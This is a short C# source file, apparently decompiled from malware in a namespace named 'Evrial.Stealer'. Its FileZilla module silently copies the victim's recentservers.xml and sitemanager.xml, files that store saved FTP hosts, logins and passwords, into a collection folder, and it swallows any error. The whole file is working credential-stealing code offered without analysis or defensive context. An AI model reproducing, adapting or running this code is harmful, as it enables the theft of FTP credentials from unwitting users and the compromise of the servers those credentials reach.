using System;
using System.IO;

namespace Evrial.Stealer
{
	// Token: 0x0200000D RID: 13
	internal class FilezillaFTP
	{
		// Token: 0x0200000E RID: 14
		internal class FileZilla
		{
			// Token: 0x0600001C RID: 28 RVA: 0x00002A48 File Offset: 0x00000C48
			public static void Initialise(string path)
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
				{
					return;
				}
				try
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", path + "filezilla_recentservers.xml", true);
				}
				catch
				{
				}
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
				{
					return;
				}
				try
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", path + "filezilla_sitemanager.xml", true);
				}
				catch
				{
				}
			}
		}
	}
}
